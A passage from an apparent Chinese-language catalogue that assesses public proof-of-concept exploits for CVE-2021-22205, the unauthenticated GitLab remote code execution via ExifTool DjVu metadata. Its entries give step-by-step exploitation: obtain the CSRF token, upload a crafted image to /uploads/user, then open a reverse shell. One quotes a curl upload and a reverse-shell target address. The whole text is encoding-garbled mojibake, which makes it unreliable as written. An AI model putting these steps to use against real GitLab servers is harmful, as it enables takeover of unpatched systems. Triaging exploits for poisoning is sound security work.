CVE-2021-22205æ˜¯GitLab CE/EEä¸­çš„ä¸€ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´žã€‚è¯¥æ¼æ´žæºäºŽGitLabæœªèƒ½æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶ï¼Œå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸Šä¼ åŒ…å«æ¶æ„ExifToolå…ƒæ•°æ®çš„å›¾åƒæ–‡ä»¶æ¥åˆ©ç”¨æ­¤æ¼æ´žã€‚

**æœ‰æ•ˆæ€§ï¼š**
æ ¹æ®æä¾›çš„æ¼æ´žä¿¡æ¯å’Œæ¼æ´žåˆ©ç”¨ä»£ç ï¼Œå¯ä»¥åˆ¤æ–­è¯¥POCä»£ç æ˜¯æœ‰æ•ˆçš„ã€‚æ¼æ´žåº“ä¿¡æ¯è¡¨æ˜Žè¯¥æ¼æ´žå½±å“å¤šä¸ªGitLabç‰ˆæœ¬ï¼Œä¸”CVSSè¯„åˆ†ä¸º10ï¼Œå±žäºŽä¸¥é‡çº§åˆ«ã€‚æ¼æ´žåˆ©ç”¨ä»£ç æ—¨åœ¨åˆ©ç”¨ExifToolåœ¨å¤„ç†æ¶æ„å›¾åƒæ—¶çš„å‘½ä»¤æ³¨å…¥æ¼æ´žã€‚

**æŠ•æ¯’é£Žé™©ï¼š**
æä¾›çš„æ¼æ´žåˆ©ç”¨ä»£ç çœ‹èµ·æ¥åƒæ˜¯åˆ©ç”¨CVE-2021-22205æ¼æ´žçš„exploitï¼Œç”¨äºŽè¿œç¨‹ä»£ç æ‰§è¡Œã€‚å…¶ä¸­å®šä¹‰äº†Sessionsç±»ä»¥æ–¹ä¾¿å‘é€HTTPè¯·æ±‚, å¹¶ä¸”ä½¿ç”¨äº†DNSLogï¼ŒPostBinï¼ŒRequestBinç­‰æœåŠ¡ä½œä¸ºéªŒè¯æ¼æ´žçš„æ–¹å¼ã€‚ä»£ç ä¸­`random_str`å‡½æ•°ç”¨äºŽç”Ÿæˆéšæœºå­—ç¬¦ä¸²ï¼Œè¿™åœ¨æ¼æ´žåˆ©ç”¨ä¸­å¾ˆå¸¸è§ï¼Œç”¨äºŽé¿å…è¢«ç®€å•è§„åˆ™æ£€æµ‹ã€‚`/tmp/5c52ea306e0854cb73063a671293313c/CVE-2021-22205.py`è¡¨æ˜Žè¯¥è„šæœ¬ä½äºŽä¸´æ—¶æ–‡ä»¶å¤¹ï¼Œå¯èƒ½è¡¨æ˜Žæ˜¯ä¸€ä¸ªæå–å‡ºæ¥çš„æˆ–è€…ä¸‹è½½çš„åˆ©ç”¨è„šæœ¬ã€‚ä»£ç ä¸­å­˜åœ¨å¯¹ä¸€äº›å¤–éƒ¨æœåŠ¡çš„è°ƒç”¨ï¼Œæ¯”å¦‚DNSLogï¼ŒRequestBinç­‰ï¼Œä½œè€…å¯èƒ½é€šè¿‡è¿™äº›æœåŠ¡æ¥æ”¶é›†ä¸€äº›ä¿¡æ¯ã€‚å› æ­¤ï¼Œå­˜åœ¨ä¸€å®šè¢«æŠ•æ¯’çš„é£Žé™©ï¼Œä¾‹å¦‚ä½œè€…åœ¨è„šæœ¬ä¸­åµŒå…¥æ¶æ„ä»£ç ï¼Œåˆ©ç”¨ç›®æ ‡æœåŠ¡å™¨çš„èµ„æºè¿›è¡ŒæŒ–çŸ¿æˆ–è€…å…¶ä»–æ¶æ„è¡Œä¸ºã€‚æ­¤å¤–ï¼ŒDNSLogå¦‚æžœè¢«æ¶æ„åŠ«æŒï¼Œå¯èƒ½å¯¼è‡´ä¿¡æ¯æ³„éœ²ã€‚ç»¼ä¸Šæ‰€è¿°ï¼Œå­˜åœ¨10%çš„æŠ•æ¯’å¯èƒ½æ€§ï¼Œè¯·ä»”ç»†å®¡è®¡ä»£ç ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  **èŽ·å–CSRF Tokenå’ŒSession Cookieï¼š** æ¼æ´žåˆ©ç”¨çš„ç¬¬ä¸€æ­¥æ˜¯èŽ·å–æœ‰æ•ˆçš„CSRF Tokenå’ŒSession Cookieã€‚POCä»£ç é¦–å…ˆå°è¯•è®¿é—® `/users/sign_in`ã€`/help` æˆ– `/explore` é¡µé¢ï¼Œç„¶åŽä»Žä¸­æå–æ‰€éœ€çš„tokenå’Œcookieã€‚
2.  **ä¸Šä¼ æ¶æ„å›¾åƒï¼š** åˆ©ç”¨èŽ·å–çš„CSRF Tokenå’ŒSession Cookieï¼Œæ”»å‡»è€…å¯ä»¥ä¸Šä¼ ä¸€ä¸ªç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶ã€‚è¯¥å›¾åƒæ–‡ä»¶çš„Exifå…ƒæ•°æ®ä¸­åŒ…å«æ¶æ„å‘½ä»¤ï¼Œè¿™äº›å‘½ä»¤å°†åœ¨GitLabæœåŠ¡å™¨ä¸Šç”±ExifToolæ‰§è¡Œã€‚
3.  **è¿œç¨‹ä»£ç æ‰§è¡Œï¼š** å½“GitLabæœåŠ¡å™¨å°è¯•å¤„ç†ä¸Šä¼ çš„å›¾åƒæ–‡ä»¶æ—¶ï¼ŒExifToolä¼šæ‰§è¡Œå›¾åƒå…ƒæ•°æ®ä¸­åµŒå…¥çš„æ¶æ„å‘½ä»¤ï¼Œä»Žè€Œå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚
4.  **OOBï¼ˆå¸¦å¤–ï¼‰éªŒè¯ï¼š**  POCä»£ç åˆå§‹åŒ–äº†DNSLogï¼ŒRequestBinç­‰æœåŠ¡ï¼Œç”¨äºŽéªŒè¯æ¼æ´žã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡DNSæŸ¥è¯¢æˆ–è€…HTTPè¯·æ±‚çš„æ–¹å¼æ¥ç¡®å®šå‘½ä»¤æ˜¯å¦æˆåŠŸæ‰§è¡Œã€‚

**é¡¹ç›®åœ°å€:** [inspiringz/CVE-2021-22205](https://github.com/inspiringz/CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #16

**æ¥æº**: [CVE-2021-22205-keven1z_CVE-2021-22205.md](../2021/CVE-2021-22205-keven1z_CVE-2021-22205.md)

## CVE-2021-22205-GitLab-RCE

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** ä¸¥é‡ï¼Œå¯å¯¼è‡´å®Œå…¨ç³»ç»ŸæŽ§åˆ¶

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** æ— éœ€èº«ä»½éªŒè¯ï¼Œç›®æ ‡GitLabå®žä¾‹å¯ä»Žç½‘ç»œè®¿é—®

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 10%

## è¯¦æƒ…

CVE-2021-22205 æ˜¯ä¸€ä¸ªå½±å“ GitLab CE/EE çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´žã€‚è¯¥æ¼æ´žå­˜åœ¨äºŽå›¾åƒæ–‡ä»¶è§£æžè¿‡ç¨‹ä¸­ï¼Œç”±äºŽ GitLab æ²¡æœ‰æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶ï¼Œå¯¼è‡´å¯ä»¥æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„ POC ä»£ç æœ‰æ•ˆã€‚å®ƒåˆ©ç”¨ ExifTool ä¸­çš„å‘½ä»¤æ³¨å…¥æ¼æ´žï¼Œé€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„ DJVU å›¾åƒæ–‡ä»¶æ¥æ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤ã€‚

**æŠ•æ¯’é£Žé™©ï¼š**
POC ä»£ç ä¸­å­˜åœ¨è½»å¾®çš„æŠ•æ¯’é£Žé™©ã€‚é£Žé™©ä¸º10%ã€‚

ä»¥ä¸‹æ˜¯å¯¹ä»£ç ä¸­å¯èƒ½å­˜åœ¨çš„æŠ•æ¯’é£Žé™©ç‚¹çš„åˆ†æžï¼š

*   **ç¡¬ç¼–ç çš„User-Agent:**  POC ä½¿ç”¨äº† `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36`ã€‚è¿™å¯èƒ½æ˜¯ä¸ºäº†ç»•è¿‡æŸäº›ç®€å•çš„ WAF è§„åˆ™ï¼Œä½†ä¹Ÿå¯èƒ½å¯¼è‡´æŒ‡çº¹è¯†åˆ«ï¼Œä»Žè€Œä½¿æ”»å‡»æ›´å®¹æ˜“è¢«æ£€æµ‹ã€‚è™½ç„¶ä¸ç®—æ¶æ„ï¼Œä½†ä¸å¤Ÿçµæ´»ï¼Œå¯èƒ½å½±å“åˆ©ç”¨æ•ˆæžœã€‚
*   **Payloadå®šæ­»ï¼Œç¼ºå°‘éšæœºæ€§ï¼š**POCä¸­ç”¨äºŽè§¦å‘æ¼æ´žçš„DJVUæ–‡ä»¶å†…å®¹ç›¸å¯¹å›ºå®šã€‚è™½ç„¶ä¿®æ”¹äº†commandéƒ¨åˆ†,ä½†æ˜¯å¦‚æžœç›®æ ‡ç³»ç»Ÿå¯¹ä¸Šä¼ æ–‡ä»¶è¿›è¡Œæ›´ä¸¥æ ¼çš„æ ¡éªŒï¼Œè¿™ç§å›ºå®šçš„Payloadå¯èƒ½ä¼šå¯¼è‡´åˆ©ç”¨å¤±è´¥ã€‚å¦‚æžœpayloadåŠ å…¥éšæœºåŒ–,å¯¹æ”»å‡»æ›´åŠ æœ‰åˆ©ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…é¦–å…ˆå‘é€ä¸€ä¸ª GET è¯·æ±‚åˆ° `/users/sign_in` èŽ·å– CSRF tokenã€‚è¯¥tokenç”¨äºŽåŽç»­çš„postè¯·æ±‚çš„è®¤è¯ã€‚
2.  æ”»å‡»è€…æž„é€ ä¸€ä¸ªæ¶æ„çš„ DJVU å›¾åƒæ–‡ä»¶ã€‚è¯¥å›¾åƒæ–‡ä»¶åœ¨ metadata å­—æ®µä¸­åµŒå…¥æ¶æ„å‘½ä»¤ã€‚
3.  æ”»å‡»è€…æž„é€ ä¸€ä¸ª multipart/form-data è¯·æ±‚ï¼Œå°†æ¶æ„å›¾åƒæ–‡ä»¶ä½œä¸ºæ–‡ä»¶ä¸Šä¼ åˆ° `/uploads/user` è·¯å¾„ã€‚
4.  å½“ GitLab å¤„ç†ä¸Šä¼ çš„å›¾åƒæ—¶ï¼ŒExifTool ä¼šè¢«è°ƒç”¨æ¥æå–å›¾åƒå…ƒæ•°æ®ã€‚ç”±äºŽå›¾åƒæ–‡ä»¶ä¸­çš„æ¶æ„å‘½ä»¤ï¼ŒExifTool ä¼šæ‰§è¡Œè¿™äº›å‘½ä»¤ï¼Œä»Žè€Œå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚
5.  åˆ©ç”¨ä»£ç ä¸­ï¼Œcommandå˜é‡å¯ä»¥å®šä¹‰åå¼¹shellæˆ–è€…æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**é¡¹ç›®åœ°å€:** [keven1z/CVE-2021-22205](https://github.com/keven1z/CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #17

**æ¥æº**: [CVE-2021-22205-momika233_cve-2021-22205-GitLab-13.10.2---Remote-Code-Execution-RCE-Unauthenticated-.md](../2021/CVE-2021-22205-momika233_cve-2021-22205-GitLab-13.10.2---Remote-Code-Execution-RCE-Unauthenticated-.md)

## CVE-2021-22205-GitLab-RCE

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** å¯ä»Žç½‘ç»œè®¿é—®å­˜åœ¨æ¼æ´žçš„GitLabå®žä¾‹ï¼Œä¸”å®žä¾‹ç‰ˆæœ¬åœ¨å—å½±å“èŒƒå›´å†…

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 0%

## è¯¦æƒ…

CVE-2021-22205 æ¼æ´žæ˜¯ GitLab CE/EE ç‰ˆæœ¬ä¸­å­˜åœ¨çš„ä¸€ä¸ªæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´žã€‚æ¼æ´žåŽŸå› æ˜¯ GitLab æœªèƒ½æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶ã€‚æ”»å‡»è€…å¯ä»¥ä¸Šä¼ ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶ï¼ˆä¾‹å¦‚ï¼ŒDjVuæ–‡ä»¶ï¼‰åˆ©ç”¨ ExifTool ä¸­çš„å‘½ä»¤æ³¨å…¥æ¼æ´žæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„PoCä»£ç çœ‹èµ·æ¥æœ‰æ•ˆã€‚å®ƒåŒ…å«ä¸¤ä¸ªä¸»è¦æ­¥éª¤ï¼š
1.  **ç”ŸæˆPayloadï¼š**  PoC é¦–å…ˆç”Ÿæˆä¸€ä¸ªåä¸º lol.jpg çš„ DjVu å›¾åƒï¼Œè¯¥å›¾åƒåŒ…å«ä¸€ä¸ªåå‘ shell çš„ Payloadã€‚è¯¥Payloadä½¿ç”¨ `base64` ç¼–ç å¹¶æ‹¼æŽ¥shellå‘½ä»¤åˆ°æ–‡ä»¶æœ«å°¾. Payloadå»ºç«‹ä¸Ž `10.0.0.3` ç«¯å£ `1270` çš„åå‘è¿žæŽ¥ï¼Œå¹¶åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šæ‰§è¡Œå‘½ä»¤ã€‚
2.  **å‘é€Payloadï¼š**  PoC ä½¿ç”¨ `curl` å‘½ä»¤å°†ç”Ÿæˆçš„ lol.jpg æ–‡ä»¶ä¸Šä¼ åˆ° GitLab å®žä¾‹ã€‚`-F 'file=@lol.jpg'` å‚æ•°å°†æ–‡ä»¶ä½œä¸º POST è¯·æ±‚çš„ä¸€éƒ¨åˆ†å‘é€ã€‚`http://10.0.0.7/$(openssl rand -hex 8)` è¡¨ç¤ºæ”»å‡»è€…å¯ä»¥é€šè¿‡ä»»æ„ endpoint è§¦å‘è¯¥æ¼æ´žã€‚

**æŠ•æ¯’é£Žé™©ï¼š**
é€šè¿‡åˆ†æžPoCä»£ç ï¼Œæ²¡æœ‰å‘çŽ°æ˜Žæ˜¾çš„æŠ•æ¯’è¿¹è±¡ã€‚è¯¥ä»£ç æ—¨åœ¨ç”Ÿæˆå¹¶ä¸Šä¼ ä¸€ä¸ªåŒ…å«åå‘ shell çš„å›¾åƒæ–‡ä»¶ã€‚æ‰€æœ‰æ“ä½œéƒ½æ˜¯ä¸ºäº†åˆ©ç”¨æ¼æ´žï¼Œå¹¶æ²¡æœ‰æ·»åŠ ä»»ä½•ä¸Žæ¼æ´žåˆ©ç”¨æ— å…³çš„æ¶æ„ä»£ç ã€‚å› æ­¤ï¼ŒæŠ•æ¯’é£Žé™©è¯„ä¼°ä¸º 0%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
åˆ©ç”¨æ–¹å¼å¦‚ä¸‹ï¼š
1.  æ”»å‡»è€…æž„é€ æ¶æ„çš„DjVuå›¾åƒï¼Œè¯¥å›¾åƒåµŒå…¥äº†å‘½ä»¤æ³¨å…¥Payloadã€‚
2.  æ”»å‡»è€…é€šè¿‡ä¸Šä¼ åŠŸèƒ½ï¼Œå°†æž„é€ çš„å›¾åƒä¸Šä¼ åˆ°å­˜åœ¨æ¼æ´žçš„GitLabå®žä¾‹ã€‚ç”±äºŽæœªè¿›è¡Œå……åˆ†çš„éªŒè¯ï¼Œä¸Šä¼ è¿‡ç¨‹ä¸ä¼šé˜»æ­¢æ¶æ„å›¾åƒã€‚
3.  GitLabåœ¨å¤„ç†å›¾åƒæ—¶ï¼Œè°ƒç”¨ExifToolç­‰å›¾åƒå¤„ç†å·¥å…·ã€‚
4.  ExifToolè§£æžæ¶æ„å›¾åƒï¼Œæ‰§è¡Œå…¶ä¸­åµŒå…¥çš„æ¶æ„å‘½ä»¤ï¼Œä»Žè€Œå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚
5.  æ”»å‡»è€…é€šè¿‡åå‘shellèŽ·å–å¯¹GitLabæœåŠ¡å™¨çš„è®¿é—®æƒé™ï¼Œä»Žè€Œå®žçŽ°å¯¹ç³»ç»Ÿçš„æŽ§åˆ¶ã€‚

**é¡¹ç›®åœ°å€:** [momika233/cve-2021-22205-GitLab-13.10.2---Remote-Code-Execution-RCE-Unauthenticated-](https://github.com/momika233/cve-2021-22205-GitLab-13.10.2---Remote-Code-Execution-RCE-Unauthenticated-)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #18

**æ¥æº**: [CVE-2021-22205-mr-r3bot_Gitlab-CVE-2021-22205.md](../2021/CVE-2021-22205-mr-r3bot_Gitlab-CVE-2021-22205.md)

## CVE-2021-22205-GitLab-RCE

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** ä¸¥é‡ï¼Œå¯èƒ½å¯¼è‡´å®Œå…¨æŽ§åˆ¶æœåŠ¡å™¨

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦ç›®æ ‡GitLabå®žä¾‹è¿è¡Œåœ¨å—å½±å“çš„ç‰ˆæœ¬ï¼Œå¹¶ä¸”èƒ½å¤Ÿé€šè¿‡ç½‘ç»œè®¿é—®

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 0%

## è¯¦æƒ…

è¯¥æ¼æ´žå­˜åœ¨äºŽGitLabä¸­ï¼Œç”±äºŽExifToolåœ¨å¤„ç†å›¾åƒæ–‡ä»¶æ—¶æœªæ­£ç¡®éªŒè¯ï¼Œå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶è§¦å‘æ¼æ´žã€‚å…·ä½“æ¥è¯´ï¼ŒGitLabä½¿ç”¨ExifToolå¤„ç†ä¸Šä¼ çš„å›¾åƒï¼Œè€ŒExifToolåœ¨å¤„ç†DjVuæ ¼å¼æ–‡ä»¶æ—¶ï¼Œå­˜åœ¨ä»£ç æ³¨å…¥æ¼æ´žã€‚æ”»å‡»è€…æž„é€ åŒ…å«æ¶æ„ä»£ç çš„DjVuæ–‡ä»¶ï¼Œå°†å…¶ä¸Šä¼ è‡³GitLabï¼Œå½“GitLabå°è¯•è§£æžè¯¥æ–‡ä»¶æ—¶ï¼Œæ¶æ„ä»£ç å°†è¢«æ‰§è¡Œï¼Œä»Žè€Œå®žçŽ°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„POCä»£ç åˆ©ç”¨äº†CVE-2021-22205æ¼æ´žï¼Œç»éªŒè¯æœ‰æ•ˆã€‚å®ƒé€šè¿‡åˆ›å»ºåŒ…å«æ¶æ„å…ƒæ•°æ®çš„DjVuå›¾åƒæ–‡ä»¶ï¼Œç„¶åŽå°†å…¶ä¸Šä¼ åˆ°GitLabå®žä¾‹ã€‚å½“GitLabå¤„ç†è¯¥å›¾åƒæ—¶ï¼ŒExifToolä¼šæ‰§è¡ŒåµŒå…¥åœ¨å…ƒæ•°æ®ä¸­çš„å‘½ä»¤ã€‚

**æŠ•æ¯’é£Žé™©ï¼š**
åˆ†æžæä¾›çš„POCä»£ç ï¼Œæ²¡æœ‰å‘çŽ°ä»»ä½•éšè—çš„æŠ•æ¯’ä»£ç ã€‚è¯¥ä»£ç çš„åŠŸèƒ½æ˜Žç¡®ï¼Œå³åˆ©ç”¨CVE-2021-22205æ¼æ´žæ‰§è¡Œå‘½ä»¤ã€‚æ‰€æœ‰æ“ä½œéƒ½åœ¨è„šæœ¬ä¸­æ¸…æ™°å¯è§ï¼Œæ²¡æœ‰æ··æ·†æˆ–éšè—è¡Œä¸ºã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…é¦–å…ˆéœ€è¦èŽ·å–ç›®æ ‡GitLabå®žä¾‹çš„URLã€‚
2.  ç„¶åŽï¼Œæ”»å‡»è€…ä½¿ç”¨POCè„šæœ¬ç”Ÿæˆä¸€ä¸ªåŒ…å«æ¶æ„DjVuå…ƒæ•°æ®çš„å›¾åƒæ–‡ä»¶ã€‚
3.  è„šæœ¬ä½¿ç”¨`djvumake`å‘½ä»¤åˆ›å»ºä¸€ä¸ªåŒ…å«æ¶æ„payloadçš„`rce.djvu`æ–‡ä»¶ï¼Œå†å°†å…¶é‡å‘½åä¸º`rce.jpg`ã€‚
4.  POCä»£ç é€šè¿‡æ¨¡æ‹Ÿæ–‡ä»¶ä¸Šä¼ è¯·æ±‚ï¼Œå°†ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶ä¸Šä¼ åˆ°GitLabå®žä¾‹ã€‚
5.  GitLabæŽ¥æ”¶åˆ°æ–‡ä»¶åŽï¼Œä¼šè°ƒç”¨ExifToolè¿›è¡Œå¤„ç†ï¼Œç”±äºŽExifToolå­˜åœ¨æ¼æ´žï¼Œå¯¼è‡´æ‰§è¡Œå›¾åƒæ–‡ä»¶ä¸­åµŒå…¥çš„æ¶æ„ä»£ç ã€‚
6.  æ”»å‡»è€…æŒ‡å®šçš„å‘½ä»¤å°†åœ¨GitLabæœåŠ¡å™¨ä¸Šæ‰§è¡Œï¼Œä»Žè€Œå®žçŽ°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

**é¡¹ç›®åœ°å€:** [mr-r3bot/Gitlab-CVE-2021-22205](https://github.com/mr-r3bot/Gitlab-CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #19

**æ¥æº**: [CVE-2021-22205-osungjinwoo_CVE-2021-22205-gitlab.md](../2021/CVE-2021-22205-osungjinwoo_CVE-2021-22205-gitlab.md)

## CVE-2021-22205-GitLab-è¿œç¨‹ä»£ç æ‰§è¡Œ

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** ä¸¥é‡ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡å™¨å®Œå…¨æŽ§åˆ¶

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8, >=13.9, <13.9.6, >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** æ— éœ€èº«ä»½éªŒè¯ï¼Œéœ€è¦ç›®æ ‡GitLabå®žä¾‹å­˜åœ¨æ¼æ´žä¸”å¯ç½‘ç»œè®¿é—®

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 5%

## è¯¦æƒ…

CVE-2021-22205æ˜¯GitLabä¸­çš„ä¸€ä¸ªè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´žã€‚è¯¥æ¼æ´žæ˜¯ç”±äºŽGitLabæ²¡æœ‰æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶ï¼Œå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚æ”»å‡»è€…å¯ä»¥ä¸Šä¼ ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«æ¶æ„ExifToolå‘½ä»¤æ³¨å…¥ä»£ç ï¼Œå½“GitLabå°è¯•å¤„ç†è¯¥å›¾åƒæ—¶ï¼ŒExifToolä¼šæ‰§è¡Œæ”»å‡»è€…æ³¨å…¥çš„å‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§ï¼š**

æ ¹æ®æ¼æ´žåº“ä¿¡æ¯å’Œæä¾›çš„POCä»£ç ï¼Œæ­¤æ¼æ´žåˆ©ç”¨æ˜¯æœ‰æ•ˆçš„ã€‚æ¼æ´žåº“ä¿¡æ¯ä¸­CVSSè¯„åˆ†ä¸º10ï¼Œå±žäºŽä¸¥é‡çº§åˆ«ï¼Œå¹¶ä¸”CISA KEVç›®å½•ä¹Ÿæ”¶å½•äº†è¯¥æ¼æ´žï¼Œè¯´æ˜Žå­˜åœ¨è¢«åˆ©ç”¨çš„æƒ…å†µã€‚POCä»£ç å®žçŽ°äº†æœªæŽˆæƒæƒ…å†µä¸‹çš„RCEï¼Œåˆ©ç”¨äº†ä¸Šä¼ åŠŸèƒ½å’ŒExifToolçš„å‘½ä»¤æ³¨å…¥ã€‚

**æŠ•æ¯’é£Žé™©ï¼š**

æä¾›çš„æ¼æ´žåˆ©ç”¨ä»£ç æœ¬èº«çš„åŠŸèƒ½æ˜¯å®žçŽ°æ¼æ´žåˆ©ç”¨ï¼Œå¹¶æ²¡æœ‰å‘çŽ°æ˜Žæ˜¾çš„æŠ•æ¯’ä»£ç ã€‚é£Žé™©è¯„ä¼°ä¸º5%ï¼Œè¾ƒä½Žã€‚

*   ä»£ç ç»“æž„æ¸…æ™°ï¼Œä¸»è¦åŠŸèƒ½ä¸ºæž„é€ æ¶æ„å›¾åƒä¸Šä¼ å¹¶æ‰§è¡Œå‘½ä»¤ã€‚
*   ä»£ç ä¸­å­˜åœ¨ä¸ŽDNSlogäº¤äº’çš„éƒ¨åˆ†ï¼Œå¯ä»¥éªŒè¯å‘½ä»¤æ‰§è¡Œï¼Œä½†ä¹Ÿå¯èƒ½è¢«æ»¥ç”¨ã€‚
*   æ€»ä½“è€Œè¨€ï¼Œä»£ç åŠŸèƒ½é›†ä¸­äºŽæ¼æ´žåˆ©ç”¨æœ¬èº«ï¼Œæ²¡æœ‰å‘çŽ°é¢å¤–æ¶æ„è¡Œä¸ºã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  æ”»å‡»è€…é¦–å…ˆæ‰¾åˆ°ç›®æ ‡GitLabå®žä¾‹çš„ç™»å½•é¡µé¢ (`/users/sign_in`)ã€‚
2.  ä»Žç™»å½•é¡µé¢çš„HTMLæºä»£ç ä¸­æå–CSRF tokenï¼Œç”¨äºŽåŽç»­çš„POSTè¯·æ±‚ã€‚
3.  æž„é€ ä¸€ä¸ªåŒ…å«æ¶æ„ExifToolå‘½ä»¤çš„ç‰¹åˆ¶å›¾åƒæ–‡ä»¶ï¼ˆå®žé™…ä¸Šæ˜¯DJVUæ–‡ä»¶ï¼‰ã€‚è¯¥æ¶æ„å‘½ä»¤è¢«åµŒå…¥åˆ°å›¾åƒçš„metadataä¸­ã€‚
4.  é€šè¿‡å‘ `/uploads/user` ç«¯ç‚¹å‘é€åŒ…å«æ¶æ„å›¾åƒæ–‡ä»¶çš„multipart/form-data POSTè¯·æ±‚ï¼Œä¸Šä¼ è¯¥å›¾åƒã€‚
5.  GitLabä½¿ç”¨ExifToolå¤„ç†ä¸Šä¼ çš„å›¾åƒæ–‡ä»¶ï¼ŒExifToolæ‰§è¡Œå›¾åƒmetadataä¸­çš„æ¶æ„å‘½ä»¤ï¼Œå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

åˆ©ç”¨ä»£ç ä¸­åŒ…å«ä¸¤ç§åˆ©ç”¨æ–¹å¼ï¼š

*   æ£€æŸ¥æ¨¡å¼ (`-v true`)ï¼šé€šè¿‡ä¸Šä¼ åŒ…å«ç‰¹å®šDNSlogåŸŸåçš„æ¶æ„å›¾ç‰‡ï¼Œæ£€æŸ¥ç›®æ ‡æ˜¯å¦å­˜åœ¨æ¼æ´žã€‚
*   æ”»å‡»æ¨¡å¼ (`-a true`)ï¼šå…è®¸æ”»å‡»è€…æŒ‡å®šè¦æ‰§è¡Œçš„å‘½ä»¤ (`-c command`)ï¼Œç›´æŽ¥åœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚
*   æ–‡ä»¶æ¨¡å¼ (`-s true`): ä¸Šä¼ æŒ‡å®šæ–‡ä»¶ `-f file`ã€‚

